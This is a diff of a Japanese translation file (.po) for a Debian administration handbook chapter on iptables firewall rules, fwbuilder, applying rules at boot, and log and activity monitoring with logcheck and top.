+msgstr "<command>iptables</command> と <command>ip6tables</command> コマンドを使って、テーブル、チェイン、ルールを操作することが可能です。<literal>-t <replaceable>table</replaceable></literal> オプションで操作対象のテーブルを指定します (デフォルトの場合、<literal>filter</literal> テーブルを操作します)。"
 
 #. Tag: title
 #, no-c-format
 msgid "Commands"
-msgstr ""
+msgstr "コマンド"
 
 #. Tag: para
 #, no-c-format
 msgid "The <literal>-N <replaceable>chain</replaceable></literal> option creates a new chain. The <literal>-X <replaceable>chain</replaceable></literal> deletes an empty and unused chain. The <literal>-A <replaceable>chain</replaceable> <replaceable>rule</replaceable></literal> adds a rule at the end of the given chain. The <literal>-I <replaceable>chain</replaceable> <replaceable>rule_num</replaceable> <replaceable>rule</replaceable></literal> option inserts a rule before the rule number <replaceable>rule_num</replaceable>. The <literal>-D <replaceable>chain</replaceable> <replaceable>rule_num</replaceable></literal> (or <literal>-D <replaceable>chain</replaceable> <replaceable>rule</replaceable></literal>) option deletes a rule in a chain; the first syntax identifies the rule to be deleted by its number, while the latter identifies it by its contents. The <literal>-F <replaceable>chain</replaceable></literal> option flushes a chain (deletes all its rules); if no chain is mentioned, all the rules in the table are deleted. The <literal>-L <replaceable>chain</replaceable></literal> option lists the rules in the chain. Finally, the <literal>-P <replaceable>chain</replaceable> <replaceable>action</replaceable></literal> option defines the default action, or “policy”, for a given chain; note that only standard chains can have such a policy."
-msgstr ""
+msgstr "<literal>-N <replaceable>chain</replaceable></literal> オプションは新しいチェインを作成します。<literal>-X <replaceable>chain</replaceable></literal> は空で使われていないチェインを削除します。<literal>-A <replaceable>chain</replaceable> <replaceable>rule</replaceable></literal> はルールをチェインの最後に追加します。<literal>-I <replaceable>chain</replaceable> <replaceable>rule_num</replaceable> <replaceable>rule</replaceable></literal> オプションは指定したルール番号 <replaceable>rule_num</replaceable> の前にルールを挿入します。<literal>-D <replaceable>chain</replaceable> <replaceable>rule_num</replaceable></literal> (または <literal>-D <replaceable>chain</replaceable> <replaceable>rule</replaceable></literal>) オプションはチェインからルールを削除します; 初めの構文はルール番号を指定してルールを削除し、後の構文はルール内容を指定してルールを削除します。<literal>-F <replaceable>chain</replaceable></literal> オプションはチェインをクリアします (チェインに含まれる全てのルールを削除します); チェインを指定しなかった場合、テーブルに含まれる全てのルールを削除します。<literal>-L <replaceable>chain</replaceable></literal> オプションはチェインに含まれるルールを表示します。最後に、<literal>-P <replaceable>chain</replaceable> <replaceable>action</replaceable></literal> オプションは指定したチェインのデフォルト動作、「ポリシー」、を定義します; ポリシーを設定できるのは標準的なチェインだけという点に注意してください。"
 
 #. Tag: title
 #, no-c-format
 msgid "Rules"
-msgstr ""
+msgstr "ルール"
 
 #. Tag: para
 #, no-c-format
 msgid "Each rule is expressed as <literal><replaceable>conditions</replaceable> -j <replaceable>action</replaceable> <replaceable>action_options</replaceable></literal>. If several conditions are described in the same rule, then the criterion is the conjunction (logical <emphasis>and</emphasis>) of the conditions, which is at least as restrictive as each individual condition."
-msgstr ""
+msgstr "それぞれのルールは <literal><replaceable>conditions</replaceable> -j <replaceable>action</replaceable> <replaceable>action_options</replaceable></literal> の形で指定します。復数の条件が同じルールとして表現された場合、復数の条件は結合 (論理 <emphasis>and</emphasis>) されます。つまり、各条件の結果を更に限定することを意味します。"
 
 #. Tag: para
 #, no-c-format
 msgid "The <literal>-p <replaceable>protocol</replaceable></literal> condition matches the protocol field of the IP packet. The most common values are <literal>tcp</literal>, <literal>udp</literal>, <literal>icmp</literal>, and <literal>icmpv6</literal>. Prefixing the condition with an exclamation mark negates the condition, which then becomes a match for “any packets with a different protocol than the specified one”. This negation mechanism is not specific to the <literal>-p</literal> option and it can be applied to all other conditions too."
-msgstr ""
+msgstr "<literal>-p <replaceable>protocol</replaceable></literal> 条件は IP パケットのプロトコルフィールドに一致します。最も普通の値は <literal>tcp</literal>、<literal>udp</literal>、<literal>icmp</literal>、<literal>icmpv6</literal> です。条件の前に感嘆符を付けることで、その条件を否定した事になります。つまり「指定したプロトコル以外の全てのプロトコルを使ったパケット」に一致します。条件否定の方法は <literal>-p</literal> オプションに限らず、他のすべての条件に適用することが可能です。"
 
 #. Tag: para
 #, no-c-format
 msgid "The <literal>-s <replaceable>address</replaceable></literal> or <literal>-s <replaceable>network/mask</replaceable></literal> condition matches the source address of the packet. Correspondingly, <literal>-d <replaceable>address</replaceable></literal> or <literal>-d <replaceable>network/mask</replaceable></literal> matches the destination address."
-msgstr ""
+msgstr "<literal>-s <replaceable>address</replaceable></literal> または <literal>-s <replaceable>network/mask</replaceable></literal> 条件は対象のパケットの送信元アドレスに一致します。同様に、<literal>-d <replaceable>address</replaceable></literal> または <literal>-d <replaceable>network/mask</replaceable></literal> は宛先アドレスに一致します。"
 
 #. Tag: para
 #, no-c-format
 msgid "The <literal>-i <replaceable>interface</replaceable></literal> condition selects packets coming from the given network interface. <literal>-o <replaceable>interface</replaceable></literal> selects packets going out on a specific interface."
-msgstr ""
+msgstr "<literal>-i <replaceable>interface</replaceable></literal> 条件は指定したネットワークインターフェイスから受信したパケットを選択します。<literal>-o <replaceable>interface</replaceable></literal> は指定したインターフェイスから送信されるパケットを選択します。"
 
 #. Tag: para
 #, no-c-format
 msgid "There are more specific conditions, depending on the generic conditions described above. For instance, the <literal>-p tcp</literal> condition can be complemented with conditions on the TCP ports, with clauses such as <literal>--source-port <replaceable>port</replaceable></literal> and <literal>--destination-port <replaceable>port</replaceable></literal>."
-msgstr ""
+msgstr "上で説明した一般的な条件ごとに、条件の範囲を狭めるためのオプションが数多く存在します。例えば、<literal>-p tcp</literal> 条件は TCP ポート番号を指定して条件範囲を狭める事が可能です。これを行うには、<literal>--source-port <replaceable>port</replaceable></literal> と <literal>--destination-port <replaceable>port</replaceable></literal> を使います。"
 
 #. Tag: para
 #, no-c-format
 msgid "The <literal>--state <replaceable>state</replaceable></literal> condition matches the state of a packet in a connection (this requires the <command>ipt_conntrack</command> kernel module, for connection tracking). The <literal>NEW</literal> state describes a packet starting a new connection; <literal>ESTABLISHED</literal> matches packets belonging to an already existing connection, and <literal>RELATED</literal> matches packets initiating a new connection related to an existing one (which is useful for the <literal>ftp-data</literal> connections in the “active” mode of the FTP protocol)."
-msgstr ""
+msgstr "<literal>--state <replaceable>state</replaceable></literal> 条件は接続中のパケットの状態を検査します (接続追跡を行うための <command>ipt_conntrack</command> カーネルモジュールが必要です)。<literal>NEW</literal> 状態は新しい接続の開始するパケットを意味します; <literal>ESTABLISHED</literal> は既に存在する接続に関連するパケットに一致します。<literal>RELATED</literal> は既存の接続に関連する新しい接続を開始するパケットに一致します (これは FTP プロトコルの「アクティブ」モードを使った<literal>ftp-data</literal> 接続の際に便利です)。"
 
 #. Tag: para
 #, no-c-format
 msgid "The previous section lists available actions, but not their respective options. The <literal>LOG</literal> action, for instance, has the following options:"
-msgstr ""
+msgstr "前の節で利用可能な動作を説明しましたが、その動作に対するオプションを説明していませんでした。例えば、<literal>LOG</literal> 動作は以下のオプションを持ちます:"
 
 #. Tag: para
 #, no-c-format
 msgid "<literal>--log-priority</literal>, with default value <literal>warning</literal>, indicates the <command>syslog</command> message priority;"
-msgstr ""
+msgstr "<literal>--log-priority</literal> は記録する <command>syslog</command> メッセージの優先度を指定します。デフォルトの場合 <literal>warning</literal> 以上の優先度を持つメッセージが記録されます;"
 
 #. Tag: para
 #, no-c-format
 msgid "<literal>--log-prefix</literal> allows specifying a text prefix to differentiate between logged messages;"
-msgstr ""
+msgstr "<literal>--log-prefix</literal> はログに記録するメッセージを特徴づけるために行の先頭に付けるテキストを指定します;"
 
 #. Tag: para
 #, no-c-format
 msgid "<literal>--log-tcp-sequence</literal>, <literal>--log-tcp-options</literal> and <literal>--log-ip-options</literal> indicate extra data to be integrated into the message: respectively, the TCP sequence number, TCP options, and IP options."
-msgstr ""
+msgstr "<literal>--log-tcp-sequence</literal>、<literal>--log-tcp-options</literal>、<literal>--log-ip-options</literal> はログメッセージに含める追加的なデータを指定します: それぞれ TCP シーケンス番号、TCP オプション、IP オプションをログメッセージに含めます。"
 
 #. Tag: para
 #, no-c-format
 msgid "The <literal>DNAT</literal> action provides the <literal>--to-destination <replaceable>address</replaceable>:<replaceable>port</replaceable></literal> option to indicate the new destination IP address and/or port. Similarly, <literal>SNAT</literal> provides <literal>--to-source <replaceable>address</replaceable>:<replaceable>port</replaceable></literal> to indicate the new source IP address and/or port."
-msgstr ""
+msgstr "<literal>DNAT</literal> 動作には <literal>--to-destination <replaceable>address</replaceable>:<replaceable>port</replaceable></literal> オプションを指定することが可能です。これは新しい宛先 IP アドレスおよびポート番号を指定するオプションです。同様に、<literal>SNAT</literal> には <literal>--to-source <replaceable>address</replaceable>:<replaceable>port</replaceable></literal> を指定することが可能です。これは新しい送信元 IP アドレスおよびポート番号を指定するオプションです。"
 
 #. Tag: para
 #, no-c-format
 msgid "The <literal>REDIRECT</literal> action (only available if NAT is available — on <emphasis role=\"distribution\">Wheezy</emphasis>, this means IPv4 only) provides the <literal>--to-ports <replaceable>port(s)</replaceable></literal> option to indicate the port, or port range, where the packets should be redirected."
-msgstr ""
+msgstr "<literal>REDIRECT</literal> 動作には <literal>--to-ports <replaceable>port(s)</replaceable></literal> オプションを指定することが可能です。これはパケットの転送先ポート番号またはポート番号範囲を指定します (<literal>REDIRECT</literal> 動作は <emphasis role=\"distribution\">Wheezy</emphasis> 上の NAT を有効化している場合にのみ使う事が可能です。つまりこれは IPv4 だけで使えることを意味します)。"
 
 #. Tag: title
 #, no-c-format
 msgid "Creating Rules"
-msgstr ""
+msgstr "ルールの作成"
 
 #. Tag: para
 #, no-c-format
 msgid "Each rule creation requires one invocation of <command>iptables</command>/<command>ip6tables</command>. Typing these commands manually can be tedious, so the calls are usually stored in a script so that the same configuration is set up automatically every time the machine boots. This script can be written by hand, but it can also be interesting to prepare it with a high-level tool such as <command>fwbuilder</command>."
-msgstr ""
+msgstr "1 つのルールを作成するには、<command>iptables</command>/<command>ip6tables</command> を 1 回実行する必要があります。これらのコマンドを手作業で実行することは退屈なので、通常スクリプトの形で保存しておきます。こうすることで、マシンの起動時に同じ設定を自動的に適用することが可能です。このスクリプトは手作業で書かなければいけませんが、<command>fwbuilder</command> 等の高レベルツールを使ってスクリプトを準備することも興味深いでしょう。"
 
 #. Tag: para
 #, no-c-format
 msgid "The principle is simple. In the first step, one needs to describe all the elements that will be involved in the actual rules:"
-msgstr ""
+msgstr "原理は簡単です。まず最初に、実際のルールに適用する全ての要素を宣言する必要があります:"
 
 #. Tag: para
 #, no-c-format
 msgid "the firewall itself, with its network interfaces;"
-msgstr ""
+msgstr "ネットワークインターフェイスとそれを使うファイヤーウォール自身;"
 
 #. Tag: para
 #, no-c-format
 msgid "the networks, with their corresponding IP ranges;"
-msgstr ""
+msgstr "対応する IP アドレス範囲とそれを使うネットワーク;"
 
 #. Tag: para
 #, no-c-format
 msgid "the servers;"
-msgstr ""
+msgstr "サーバ;"
 
 #. Tag: para
 #, no-c-format
 msgid "the ports belonging to the services hosted on the servers."
-msgstr ""
+msgstr "サーバでホストされているサービスに対応するポート番号。"
 
 #. Tag: para
 #, no-c-format
 msgid "The rules are then created with simple drag-and-drop actions on the objects. A few contextual menus can change the condition (negating it, for instance). Then the action needs to be chosen and configured."
-msgstr ""
+msgstr "オブジェクトに対する単純なドラッグアンドドロップ動作を使ってルールを作成します。一部のコンテキストメニューを使ってルールの条件を変更する (例えば条件を否定する) ことが可能です。そして、動作を選んで設定する必要があります。"
 
 #. Tag: para
 #, no-c-format
 msgid "As far as IPv6 is concerned, one can either create two distinct rulesets for IPv4 and IPv6, or create only one and let <command>fwbuilder</command> translate the rules according to the addresses assigned to the objects."
-msgstr ""
+msgstr "IPv6 に関心があるなら、IPv4 と IPv6 で別々のルールセットを作成するか、片方だけを作成してオブジェクトに割り当てられたアドレスに応じて <command>fwbuilder</command> にそのルールを変換してもらうか、のどちらか一方を行うことが可能です。"
 
 #. Tag: title
 #, no-c-format
 msgid "Fwbuilder's main window"
-msgstr ""
+msgstr "fwbuilder のメインウィンドウ"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary><command>fwbuilder</command></primary>"
-msgstr ""
+msgstr "<primary><command>fwbuilder</command></primary>"
 
 #. Tag: para
 #, no-c-format
 msgid "<command>fwbuilder</command> can then generate a script configuring the firewall according to the rules that have been defined. Its modular architecture gives it the ability to generate scripts targeting different systems (<command>iptables</command> for Linux, <command>ipf</command> for FreeBSD and <command>pf</command> for OpenBSD)."
-msgstr ""
+msgstr "<command>fwbuilder</command> は定義されたルールに従ってファイヤーウォールを設定するためのスクリプトを生成することが可能です。モジュール式のアーキテクチャのお陰で、<command>fwbuilder</command> は様々なファイヤーウォールシステム (Linux の <command>iptables</command>、FreeBSD の <command>ipf</command>、OpenBSD の <command>pf</command>) を設定するためのスクリプトを生成する事が可能です。"
 
 #. Tag: para
 #, no-c-format
 msgid "Versions of the <emphasis role=\"pkg\">fwbuilder</emphasis> package since <emphasis role=\"distribution\">Squeeze</emphasis> contain both the graphical interface and the modules for each firewall system (these were previously split over several packages, one for each target system):"
-msgstr ""
+msgstr "<emphasis role=\"distribution\">Squeeze</emphasis> 以降の <emphasis role=\"pkg\">fwbuilder</emphasis> パッケージには、グラフィカルインターフェイスと様々なファイヤーウォールシステム用のモジュール (以前、これらはシステム毎に復数のパッケージに分割されていました) が含まれます:"
 
 #. Tag: screen
 #, no-c-format
 msgid ""
 "\n"
 "<computeroutput># </computeroutput><userinput>aptitude install fwbuilder</userinput>\n"
-msgstr ""
+msgstr "\n<computeroutput># </computeroutput><userinput>aptitude install fwbuilder</userinput>\n"
 
 #. Tag: title
 #, no-c-format
 msgid "Installing the Rules at Each Boot"
-msgstr ""
+msgstr "起動時にルールを適用する"
 
 #. Tag: para
 #, no-c-format
 msgid "If the firewall is meant to protect an intermittent PPP network connection, the simplest way to deploy the script is to install it as <filename>/etc/ppp/ip-up.d/0iptables</filename> (note that only files without a dot in their name are taken into account). The firewall will thus be reloaded every time a PPP connection is established."
-msgstr ""
+msgstr "ファイヤーウォールが断続的な PPP ネットワーク接続を保護するように設定されていた場合、スクリプトを <filename>/etc/ppp/ip-up.d/0iptables</filename> に配置することが最も単純な方法です (名前にドットを含まないファイルだけが考慮されます)。ファイヤーウォールは PPP 接続が確立された時点で毎回再読込されます。"
 
 #. Tag: para
 #, no-c-format
 msgid "In other cases, the recommended way is to register the configuration script in an <literal>up</literal> directive of the <filename>/etc/network/interfaces</filename> file. In the following example, the script is stored under <filename>/usr/local/etc/arrakis.fw</filename>."
-msgstr ""
+msgstr "別のやり方として、設定スクリプトを <filename>/etc/network/interfaces</filename> ファイルの <literal>up</literal> 指示文に登録する方法も推奨されます。以下の例では、設定スクリプトは <filename>/usr/local/etc/arrakis.fw</filename> に保存されています。"
 
 #. Tag: title
 #, no-c-format
 msgid "<filename>interfaces</filename> file calling firewall script"
-msgstr ""
+msgstr "ファイヤーウォールスクリプト呼び出す <filename>interfaces</filename> ファイル"
 
 #. Tag: programlisting
 #, no-c-format
@@ -592,276 +592,283 @@ msgid ""
 "    broadcast 192.168.0.255\n"
 "    up /usr/local/etc/arrakis.fw\n"
 msgstr ""
+"auto eth0\n"
+"iface eth0 inet static\n"
+"    address 192.168.0.1\n"
+"    network 192.168.0.0\n"
+"    netmask 255.255.255.0\n"
+"    broadcast 192.168.0.255\n"
+"    up /usr/local/etc/arrakis.fw\n"
 
 #. Tag: title
 #, no-c-format
 msgid "Supervision: Prevention, Detection, Deterrence"
-msgstr ""
+msgstr "監督: 防止、検知、監査"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>monitoring</primary>"
-msgstr ""
+msgstr "<primary>監視</primary>"
 
 #. Tag: para
 #, no-c-format
 msgid "Monitoring is an integral part of any security policy for several reasons. Among them, that the goal of security is usually not restricted to guaranteeing data confidentiality, but it also includes ensuring availability of the services. It is therefore imperative to check that everything works as expected, and to detect in a timely manner any deviant behavior or change in quality of the service(s) rendered. Monitoring activity can help detecting intrusion attempts and enable a swift reaction before they cause grave consequences. This section reviews some tools that can be used to monitor several aspects of a Debian system. As such, it completes the section dedicated to generic system monitoring in <xref linkend=\"advanced-administration\" />."
-msgstr ""
+msgstr "監視は幾つかの理由によってセキュリティポリシーの不可欠な要素になっています。中でも、セキュリティの目標には、通常データの機密性を保証するだけでなく、サービスの可用性を保証することも含まれています。そのため、全てが思った通り稼働しているかを確認したり、様々な逸脱した挙動や提供しているサービス品質の変化をタイミング良く検知したり、することが不可欠です。監視活動のお陰で、危機的状況に陥る前に、不正侵入の試行を検知し迅速に対応することが可能です。この節では、Debian システムの様々な側面を監視するために使える幾つかのツールを概説します。この節は <xref linkend=\"advanced-administration\" />内の一般的なシステム監視について書かれた節を補完するものです。"
 
 #. Tag: title
 #, no-c-format
 msgid "Monitoring Logs with <command>logcheck</command>"
-msgstr ""
+msgstr "<command>logcheck</command> を使ったログ監視"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary><command>logcheck</command></primary>"
-msgstr ""
+msgstr "<primary><command>logcheck</command></primary>"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>logs</primary><secondary>monitoring</secondary>"
-msgstr ""
+msgstr "<primary>ログ</primary><secondary>監視</secondary>"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>monitoring</primary><secondary>log files</secondary>"
-msgstr ""
+msgstr "<primary>監視</primary><secondary>ログファイル</secondary>"
 
 #. Tag: para
 #, no-c-format
 msgid "The <command>logcheck</command> program monitors log files every hour by default. It sends unusual log messages in emails to the administrator for further analysis."
-msgstr ""
+msgstr "<command>logcheck</command> プログラムはデフォルトでは毎時間ログファイルを監視します。<command>logcheck</command> はログメッセージを電子メールで管理者に送信し、さらなる解析を促します。"
 
 #. Tag: para
 #, no-c-format
 msgid "The list of monitored files is stored in <filename>/etc/logcheck/logcheck.logfiles</filename>; the default values work fine if the <filename>/etc/syslog.conf</filename> file has not been completely overhauled."
-msgstr ""
+msgstr "監視されるファイルのリストは <filename>/etc/logcheck/logcheck.logfiles</filename> に保存されています; <filename>/etc/syslog.conf</filename> ファイルが完全に書き換えられていなければ、デフォルト値で上手く動作します。"
 
 #. Tag: para
 #, no-c-format
 msgid "<command>logcheck</command> can work in one of three more or less detailed modes: <emphasis>paranoid</emphasis>, <emphasis>server</emphasis> and <emphasis>workstation</emphasis>. The first one is <emphasis>very</emphasis> verbose, and should probably be restricted to specific servers such as firewalls. The second (and default) mode is recommended for most servers. The last one is designed for workstations, and is even terser (it filters out more messages)."
-msgstr ""
+msgstr "<command>logcheck</command> の動作モードは 3 種類の内の 1 つから選ぶ事が可能です: <emphasis>paranoid</emphasis>、<emphasis>server</emphasis>、<emphasis>workstation</emphasis> です。<emphasis>paranoid</emphasis> モードは<emphasis>とても</emphasis>詳細で、このモードを使うのはファイヤーウォール等の特定のサーバに限定するべきです。<emphasis>server</emphasis> モードはデフォルトで、殆どのサーバではこのモードを使うことを推奨します。<emphasis>workstation</emphasis> モードはワークステーション用に設計されており、かなり簡潔です (より多くのメッセージをフィルタします)。"
 
 #. Tag: para
 #, no-c-format
 msgid "In all three cases, <command>logcheck</command> should probably be customized to exclude some extra messages (depending on installed services), unless the admin really wishes to receive hourly batches of long uninteresting emails. Since the message selection mechanism is rather complex, <filename>/usr/share/doc/logcheck-database/README.logcheck-database.gz</filename> is a required — if challenging — read."
-msgstr ""
+msgstr "管理者は毎時間のバッチ処理のたびに長くてつまらない電子メールを受け取ることを本当に望むのでなければ、3 つのモード全てで <command>logcheck</command> を (インストール済みサービスに従い) カスタマイズして幾つかの余分なメッセージを除外するべきです。メッセージ選択メカニズムはかなり複雑なので、もし挑戦するなら <filename>/usr/share/doc/logcheck-database/README.logcheck-database.gz</filename> を読むと良いでしょう。"
 
 #. Tag: para
 #, no-c-format
 msgid "The applied rules can be split into several types:"
-msgstr ""
+msgstr "適用されるルールは幾つかの種類に分かれます:"
 
 #. Tag: para
 #, no-c-format
 msgid "those that qualify a message as a cracking attempt (stored in a file in the <filename>/etc/logcheck/cracking.d/</filename> directory);"
-msgstr ""
+msgstr "クラッキングの試行として分類するメッセージのルール (<filename>/etc/logcheck/cracking.d/</filename> ディレクトリ内のファイルに保存します);"
 
 #. Tag: para
 #, no-c-format
 msgid "those canceling such a qualification (<filename>/etc/logcheck/cracking.ignore.d/</filename>);"
-msgstr ""
+msgstr "クラッキングの試行としての分類を解除するメッセージのルール (<filename>/etc/logcheck/cracking.ignore.d/</filename>);"
 
 #. Tag: para
 #, no-c-format
 msgid "those classifying a message as a security alert (<filename>/etc/logcheck/violations.d/</filename>);"
-msgstr ""
+msgstr "セキュリティ警告として分類するメッセージのルール (<filename>/etc/logcheck/violations.d/</filename>);"
 
 #. Tag: para
 #, no-c-format
 msgid "those canceling this classification (<filename>/etc/logcheck/violations.ignore.d/</filename>);"
-msgstr ""
+msgstr "セキュリティ警告としての分類を解除するメッセージのルール (<filename>/etc/logcheck/violations.ignore.d/</filename>);"
 
 #. Tag: para
 #, no-c-format
 msgid "finally, those applying to the remaining messages (considered as <emphasis>system events</emphasis>)."
-msgstr ""
+msgstr "最後に、残りのメッセージに適用するルール (<emphasis>システムイベント</emphasis>として分類されます)。"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>CAUTION</emphasis> Ignoring a message"
-msgstr ""
+msgstr "<emphasis>CAUTION</emphasis> メッセージの無視"
 
 #. Tag: para
 #, no-c-format
 msgid "Any message tagged as a cracking attempt or a security alert (following a rule stored in a <filename>/etc/logcheck/violations.d/myfile</filename> file) can only be ignored by a rule in a <filename>/etc/logcheck/violations.ignore.d/myfile</filename> or <filename>/etc/logcheck/violations.ignore.d/myfile-<replaceable>extension</replaceable></filename> file."
-msgstr ""
+msgstr "クラッキング試行や (<filename>/etc/logcheck/violations.d/myfile</filename> ファイルに保存されているルールに従い) セキュリティ警告としてタグ付けされたメッセージを無視するには、<filename>/etc/logcheck/violations.ignore.d/myfile</filename> または <filename>/etc/logcheck/violations.ignore.d/myfile-<replaceable>extension</replaceable></filename> ファイルを使います。"
 
 #. Tag: para
 #, no-c-format
 msgid "A system event is always signaled unless a rule in one of the <filename>/etc/logcheck/ignore.d.{paranoid,server,workstation}/</filename> directories states the event should be ignored. Of course, the only directories taken into account are those corresponding to verbosity levels equal or greater than the selected operation mode."
-msgstr ""
+msgstr "<filename>/etc/logcheck/ignore.d.{paranoid,server,workstation}/</filename> ディレクトリ内のルールの 1 つによってシステムイベントが無視されなかった場合を除いて、常にシステムイベントは通知されます。もちろん、ここで考慮されるディレクトリは、選択された動作モードの冗長性レベル以上の冗長性レベルに対応するディレクトリです。"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>TIP</emphasis> Your logs as screen background"
-msgstr ""
+msgstr "<emphasis>TIP</emphasis> 画面背景にログを表示する"
 
 #. Tag: para
 #, no-c-format
 msgid "Some administrators like seeing their log messages scroll by in real time; the <command>root-tail</command> command (in the <emphasis role=\"pkg\">root-tail</emphasis>) package can be used to integrate the logs into the background of their graphical desktop. The <command>xconsole</command> program (in the <emphasis>x11-apps</emphasis> package) can also have them scrolling in a small window. Messages are directly taken from <command>syslogd</command> via the <filename>/dev/xconsole</filename> named pipe."
-msgstr ""
+msgstr "一部の管理者はリアルタイムでログメッセージをスクロール表示したいと思っています。<command>root-tail</command> コマンド (<emphasis role=\"pkg\">root-tail</emphasis> に含まれます) パッケージを使って、グラフィカルデスクトップの背景にログを表示する事が可能です。<command>xconsole</command> プログラム (<emphasis>x11-apps</emphasis> パッケージに含まれます) も小さなウィンドウにログをスクロール表示させることが可能です。メッセージは <filename>/dev/xconsole</filename> 名前付きパイプを使って直接 <command>syslogd</command> から取得されます。"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary><command>root-tail</command></primary>"
-msgstr ""
+msgstr "<primary><command>root-tail</command></primary>"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>logs</primary><secondary>display</secondary>"
-msgstr ""
+msgstr "<primary>ログ</primary><secondary>表示</secondary>"
 
 #. Tag: title
 #, no-c-format
 msgid "Monitoring Activity"
-msgstr ""
+msgstr "監視活動"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>monitoring</primary><secondary>activity</secondary>"
-msgstr ""
+msgstr "<primary>監視</primary><secondary>活動</secondary>"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>activity, monitoring</primary>"
-msgstr ""
+msgstr "<primary>活動、監視</primary>"
 
 #. Tag: title
 #, no-c-format
 msgid "In Real Time"
-msgstr ""
+msgstr "リアルタイム監視"
 
 #. Tag: para
 #, no-c-format
 msgid "<command>top</command> is an interactive tool that displays a list of currently running processes. The default sorting is based on the current amount of processor use and can be obtained with the <keycap>P</keycap> key. Other sort orders include a sort by occupied memory (<keycap>M</keycap> key), by total processor time (<keycap>T</keycap> key) and by process identifier (<keycap>N</keycap> key). The <keycap>k</keycap> key allows killing a process by entering its process identifier. The <keycap>r</keycap> key allows <emphasis>renicing</emphasis> a process, i.e. changing its priority."
-msgstr ""
+msgstr "<command>top</command> は現在実行中のプロセスのリストを表示する対話型ツールです。デフォルトでは現在のプロセッサ使用量に基いてソートされ、 <keycap>P</keycap> キーを押すことで内容を更新することが可能です。他のソート基準として、占有メモリ量 (<keycap>M</keycap> キー)、総プロセッサ時間 (<keycap>T</keycap> キー)、プロセス識別子 (<keycap>N</keycap> キー) などがあります。<keycap>k</keycap> キーに続けてプロセス識別子を入力することで、識別子に対応するプロセスを殺すことが可能です。<keycap>r</keycap> キーを使ってプロセスの <emphasis>renicing</emphasis> を行うことが可能です、つまり優先度を変更する事が可能です。"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary><command>top</command></primary>"
-msgstr ""
+msgstr "<primary><command>top</command></primary>"
 
 #. Tag: para
 #, no-c-format
 msgid "When the system seems to be overloaded, <command>top</command> is a great tool to see which processes are competing for processor time or consume too much memory. In particular, it is often interesting to check if the processes consuming resources match the real services that the machine is known to host. An unknown process running as the www-data user should really stand out and be investigated, since it's probably an instance of software installed and executed on the system through a vulnerability in a web application."
-msgstr ""
+msgstr "システムの負荷が高過ぎる場合、<command>top</command> という素晴らしいツールを使って、プロセッサ時間を奪っていたりメモリを大量に消費しているプロセスを調査します。特に、リソースを消費しているプロセスがそのマシンでホストされている事を知られている本物のサービスに一致しているか否かを確認することは興味深いです。www-data ユーザとして実行されている不明なプロセスは特に警戒して調査するべきです。なぜなら、その不明なプロセスはウェブアプリケーションの脆弱性を利用してシステムにインストールおよび実行されたソフトウェアのインスタンスかもしれないからです。"
 
 #. Tag: para
 #, no-c-format
 msgid "<command>top</command> is a very flexible tool and its manual page gives details on how to customize its display and adapt it to one's personal needs and habits."
-msgstr ""
+msgstr "<command>top</command> はとても柔軟性の高いツールで、マニュアルページは表示をカスタマイズする方法とそのカスタマイズの結果を個人的なニーズや習慣に反映させる方法を詳細に説明しています。"
 
 #. Tag: para
 #, no-c-format
 msgid "The <command>gnome-system-monitor</command> and <command>qps</command> graphical tools are similar to <command>top</command> and they provide roughly the same features."
-msgstr ""
+msgstr "<command>gnome-system-monitor</command> と <command>qps</command> グラフィカルツールは <command>top</command> とよく似ており、大まかに言って同じ機能を備えています。"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary><command>gnome-system-monitor</command></primary>"
-msgstr ""
+msgstr "<primary><command>gnome-system-monitor</command></primary>"
 
 #. Tag: title
 #, no-c-format
 msgid "History"
-msgstr ""
+msgstr "歴史"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>activity, history</primary>"
-msgstr ""
+msgstr "<primary>活動、歴史</primary>"
 
 #. Tag: para
 #, no-c-format
 msgid "Processor load, network traffic and free disk space are information that are constantly varying. Keeping a history of their evolution is often useful in determining exactly how the computer is used."
-msgstr ""
+msgstr "プロセッサの負荷、ネットワークトラフィック、空きディスク領域などの情報は絶えず変わります。これらの情報の時間変化を保存しておくと、コンピュータの使われ方を明らかにするためには便利です。"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>SNMP</primary>"
-msgstr ""
+msgstr "<primary>SNMP</primary>"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>Simple Network Management Protocol</primary>"
-msgstr ""
+msgstr "<primary>Simple Network Management Protocol</primary>"
 
 #. Tag: para
 #, no-c-format
 msgid "There are many dedicated tools for this task. Most can fetch data via SNMP (<emphasis>Simple Network Management Protocol</emphasis>) in order to centralize this information. An added benefit is that this allows fetching data from network elements that may not be general-purpose computers, such as dedicated network routers or switches."
-msgstr ""
+msgstr "このタスクには専用のツールが沢山あります。殆どのツールは、この種の情報を中央に集めるために、SNMP (<emphasis>Simple Network Management Protocol</emphasis>) を介してデータを取得します。SNMP を使うことで、汎用コンピュータ以外のネットワーク要素、例えば専用ネットワークルータやスイッチ、からデータを取得する事が可能になるという恩恵があります。"
 
 #. Tag: para
 #, no-c-format
 msgid "This book deals with Munin in some detail (see <xref linkend=\"sect.munin\" />) as part of <xref linkend=\"advanced-administration\" xrefstyle=\"select: label quotedtitle\" />. Debian also provides a similar tool, <emphasis role=\"pkg\">cacti</emphasis>. Its deployment is slightly more complex, since it is based solely on SNMP. Despite having a web interface, grasping the concepts involved in configuration still requires some effort. Reading the HTML documentation (<filename>/usr/share/doc/cacti/html/index.html</filename>) should be considered a prerequisite."
-msgstr ""
